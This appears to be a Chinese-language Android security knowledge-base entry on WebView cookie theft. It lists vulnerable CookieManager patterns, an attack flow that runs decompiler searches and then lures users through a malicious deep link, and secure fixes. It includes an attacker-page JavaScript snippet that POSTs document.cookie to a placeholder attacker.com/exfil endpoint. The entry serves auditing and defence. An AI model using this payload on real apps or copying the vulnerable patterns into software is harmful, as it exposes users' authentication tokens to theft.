# WebView Cookie 窃取

**Risk: MEDIUM**

应用使用 `CookieManager` 为攻击者控制的域名设置敏感 Cookie（如 Token），或 Cookie 可通过 JS 读取，导致认证信息泄露。


## 利用前提

应用使用 WebView 加载外部 URL，并通过 `CookieManager.setCookie()` 为该 URL 设置认证 Cookie。如果域名验证不当，可能为攻击者域名设置 Cookie；同一应用内所有 WebView 共享 Cookie 存储。

**Android 版本范围：所有版本可利用** — 应用层实现问题，无系统修复。


## 攻击流程

```
1. decx code subclass android.webkit.WebView → 定位 WebView Activity
2. decx code class-source <WebViewActivity> → 获取源码
3. decx code xref-method "android.webkit.CookieManager.setCookie(java.lang.String,java.lang.String):void" → 搜索 CookieManager.setCookie 调用
4. 攻击者诱导用户打开恶意 Deep Link
5. 应用加载攻击者 URL 并在 Cookie 中设置 Token
6. 攻击者页面 JS 读取 Cookie: document.cookie
7. Token 被发送到攻击者服务器
```


## 关键特征与代码

### 模式 1：为攻击者域名设置 Token Cookie

```java
// 漏洞：未验证 URL 就为攻击者域名设置 Token Cookie
String attackerUrl = getIntent().getDataString(); // 来自外部
CookieManager manager = CookieManager.getInstance();
manager.setCookie(attackerUrl, "token=" + getUserToken()); // Token 泄露到攻击者域名
webView.loadUrl(attackerUrl);
// 攻击者页面 JS: document.cookie → 获取 Token
```

### 模式 2：Cookie 存储共享

```java
// 同一应用内所有 WebView 共享 Cookie 存储
// Activity A:
CookieManager.getInstance().setCookie("https://api.example.com", "session=secret");
// Activity B（加载攻击者页面）:
webView.loadUrl("https://attacker.com/steal.html");
// 攻击者页面通过 JS 跨域读取 Cookie（如果设置不当）
```

### 模式 3：JS 可读取敏感 Cookie

```java
// 漏洞：敏感 Cookie 未设置 HttpOnly 属性，JS 可读取
CookieManager manager = CookieManager.getInstance();
manager.setCookie(url, "auth_token=secret123; Path=/"); // JS 可通过 document.cookie 读取
webView.getSettings().setJavaScriptEnabled(true);
```

**攻击者页面代码：**

```javascript
// 窃取 Cookie
fetch("https://attacker.com/exfil", {
    method: "POST",
    body: JSON.stringify({ cookie: document.cookie })
});

// 如果 Cookie 设置在攻击者域名，直接读取
```


## 安全写法

```java
// 方案 1：验证 URL 白名单后再设置 Cookie
private static final Set<String> ALLOWED_DOMAINS = Set.of(
    "api.example.com",
    "cdn.example.com"
);

private void setAuthCookie(WebView webView, String url) {
    Uri uri = Uri.parse(url);
    String host = uri.getHost();
    // 仅在白名单域名设置 Cookie
    if (ALLOWED_DOMAINS.contains(host)) {
        CookieManager manager = CookieManager.getInstance();
        manager.setCookie(url, "token=" + getUserToken() + "; HttpOnly; Secure");
        webView.loadUrl(url);
    } else {
        Log.w(TAG, "Refused to set cookie for: " + host);
    }
}

// 方案 2：使用 HTTP Header 传递 Token，而非 Cookie
Map<String, String> headers = new HashMap<>();
headers.put("Authorization", "Bearer " + getUserToken());
webView.loadUrl(url, headers);

// 方案 3：预安装 Cookie 到可信域名
// 应用启动时预先为可信域名安装 Cookie，运行时不再动态设置
CookieManager manager = CookieManager.getInstance();
manager.setCookie("https://api.example.com", "session=" + getUserToken());

// Cookie 设置安全属性
// token=secret; HttpOnly; Secure; SameSite=Strict
```


## 经典案例

| 案例 | 攻击场景 |
|------|----------|
| **某社交 APP** | Deep Link 加载外部 URL，未验证域名就设置 Token Cookie |
| **某电商 APP** | 分享功能加载外部页面，Cookie 包含用户会话信息 |
| **Oversecured OVAA** | WebView Cookie 管理不当导致认证信息泄露 |


## 关联漏洞与组合利用

| 组合 | 链条效果 | 参考文件 |
|------|----------|----------|
| + URL 加载绕过 | URL 白名单被绕过，为攻击者域名设置 Cookie | → [[app-webview-url-bypass]] |
| + JS Bridge | Cookie 读取后通过 JS Bridge 外发到攻击者服务器 | → [[app-webview-js-bridge]] |
| + Deep Link | 通过恶意 Deep Link 触发 WebView 加载攻击者页面 | → [[app-intent]] |


## Related

- [[app-webview-url-bypass]]
- [[app-webview-js-bridge]]
- [[app-webview]]
